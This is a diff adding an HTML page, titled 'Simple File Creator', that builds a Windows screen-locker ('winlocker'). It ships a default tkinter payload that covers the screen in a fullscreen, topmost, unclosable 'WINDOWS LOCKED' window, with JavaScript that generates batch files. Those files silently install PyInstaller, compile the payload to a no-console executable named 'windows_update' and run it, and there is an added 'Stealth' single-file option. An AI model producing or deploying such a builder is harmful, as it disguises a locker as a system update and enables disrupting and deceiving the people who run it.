@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Simple File Creator</title>
+    <style>
+        body { font-family: Arial; margin: 40px; }
+        textarea { width: 100%; height: 200px; }
+        button { padding: 10px 20px; margin: 10px 0; }
+        .container { max-width: 800px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Create Auto-Compiling File</h2>
+        
+        <p>Enter your Python code:</p>
+        <textarea id="code">import tkinter as tk
+from tkinter import messagebox
+import os
+import sys
+
+password = "123"
+root = tk.Tk()
+root.attributes('-fullscreen', True)
+root.attributes('-topmost', True)
+root.configure(bg='black')
+
+label = tk.Label(root, text="WINDOWS LOCKED\\nEnter password: " + password, 
+                 font=('Arial', 24), fg='red', bg='black')
+label.pack(pady=50)
+
+entry = tk.Entry(root, show='*', font=('Arial', 18))
+entry.pack(pady=20)
+entry.focus()
+
+def check_password():
+    if entry.get() == password:
+        root.destroy()
+    else:
+        messagebox.showerror("Error", "Wrong password!")
+        entry.delete(0, tk.END)
+
+button = tk.Button(root, text="UNLOCK", font=('Arial', 18), 
+                   command=check_password, bg='red', fg='white')
+button.pack(pady=10)
+
+root.bind('<Return>', lambda event: check_password())
+root.protocol("WM_DELETE_WINDOW", lambda: None)
+root.mainloop()</textarea>
+        
+        <p>Filename (will create .bat and .py files):</p>
+        <input type="text" id="filename" value="windows_update" style="width: 300px;">
+        
+        <br>
+        <button onclick="createAutoCompiler()">Create Auto-Compile Files</button>
+        
+        <script>
+            function createAutoCompiler() {
+                const code = document.getElementById('code').value;
+                const basename = document.getElementById('filename').value.replace('.bat', '').replace('.py', '');
+                
+                // Create the Python script
+                const pyContent = `# ${basename}.py - Main script
+${code}
+`;
+                
+                // Create the batch file that compiles and runs
+                const batContent = `@echo off
+echo Installing required components...
+pip install pyinstaller >nul 2>&1
+echo Compiling to executable...
+pyinstaller --onefile --noconsole "${basename}.py" >nul 2>&1
+echo Running application...
+start "" "dist\\\\${basename}.exe"
+echo Done.
+pause
+`;
+                
+                // Download Python file
+                const pyBlob = new Blob([pyContent], { type: 'text/plain' });
+                const pyLink = document.createElement('a');
+                pyLink.href = URL.createObjectURL(pyBlob);
+                pyLink.download = basename + '.py';
+                document.body.appendChild(pyLink);
+                pyLink.click();
+                document.body.removeChild(pyLink);
+                
+                // Download Batch file
+                const batBlob = new Blob([batContent], { type: 'application/bat' });
+                const batLink = document.createElement('a');
+                batLink.href = URL.createObjectURL(batBlob);
+                batLink.download = basename + '.bat';
+                document.body.appendChild(batLink);
+                batLink.click();
+                document.body.removeChild(batLink);
+                
+                setTimeout(() => {
+                    alert('Downloaded two files: ' + basename + '.py and ' + basename + '.bat\\n\\nDouble-click the .bat file to compile and run!');
+                }, 100);
+            }
+        </script>
+
+        <h3>How to Use:</h3>
+        <ol>
+            <li>Enter your Python winlocker code above</li>
+            <li>Click "Create Auto-Compile Files"</li>
+            <li>Two files will download: .py and .bat</li>
+            <li>Double-click the .bat file</li>
+            <li>It automatically installs PyInstaller, compiles to EXE, and runs the winlocker</li>
+        </ol>
+
+        <h3>Single File Version (Stealth):</h3>
+        <button onclick="createSingleBat()">Create Single BAT File</button>
+
+        <script>
+            function createSingleBat() {
+                const code = document.getElementById('code').value;
+                const basename = document.getElementById('filename').value.replace('.bat', '');
+                
+                // Create a single batch file with embedded Python
+                const batContent = `@echo off
+echo Creating Python script...
+echo import tkinter as tk > temp_script.py
+echo from tkinter import messagebox >> temp_script.py
+echo import os >> temp_script.py
+echo import sys >> temp_script.py
+${code.split('\n').map(line => `echo ${line} >> temp_script.py`).join('\n')}
+
+echo Installing PyInstaller...
+pip install pyinstaller >nul 2>&1
+echo Compiling to executable...
+pyinstaller --onefile --noconsole temp_script.py >nul 2>&1
+echo Running winlocker...
+start "" "dist\\\\temp_script.exe"
+del temp_script.py
+echo Process completed.
+pause
+`;
+                
+                const batBlob = new Blob([batContent], { type: 'application/bat' });
+                const batLink = document.createElement('a');
+                batLink.href = URL.createObjectURL(batBlob);
+                batLink.download = basename + '_compiler.bat';
+                batLink.click();
+            }
+        </script>
+    </div>
+</body>
+</html>
